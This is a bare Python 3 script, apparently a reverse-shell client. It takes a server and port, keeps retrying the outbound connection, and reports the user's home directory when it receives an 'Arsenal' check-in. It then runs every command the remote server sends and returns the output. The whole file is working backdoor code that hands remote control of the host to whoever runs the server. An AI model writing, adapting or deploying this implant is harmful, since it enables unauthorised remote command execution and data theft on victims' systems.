#!/usr/bin/python3
import socket, sys, os, subprocess, argparse, time
parser = argparse.ArgumentParser(description='q*bert says hello')
parser.add_argument('-p', dest='port', required=True, type=int)
parser.add_argument('-s', dest='server', required=True)
args = parser.parse_args()

def main():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    buff = 4096
    while True:
        try:
            s.connect((args.server, args.port))
        except socket.error:
            for i in range(15, 0, -1):
                sys.stdout.write("Connection refused, retrying in %d seconds" %i)
                time.sleep(1)
            continue
        break
    while True:
        try:
            received = s.recv(buff).strip().split()
            command = [ str(x, 'utf-8') for x in received ]
            if 'Arsenal' in str(command):
                s.send(b'Client initial checkin\n')
                s.send(bytes("Homedir: " + os.environ.get('HOME'), "utf-8"))
                continue
            else:
                print(command)
                output = subprocess.run(command, stdout=subprocess.PIPE)
                s.send(bytes(output.stdout))
        except OSError as err:
            print("{0}\n".format(err))

if __name__ == '__main__':
    main()
